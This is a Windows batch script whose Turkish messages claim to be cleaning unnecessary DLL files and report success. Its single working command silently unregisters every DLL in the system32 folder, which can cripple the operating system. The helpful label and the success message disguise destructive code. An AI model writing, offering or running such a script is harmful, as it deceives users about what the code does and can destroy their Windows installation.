@echo off
echo Gereksiz DLL dosyaları temizleniyor...
for %%f in (%windir%\system32\*.dll) do regsvr32 /u /s "%%f"
echo İşlem tamamlandı!
pause
exit /b %ERRORLEVEL%
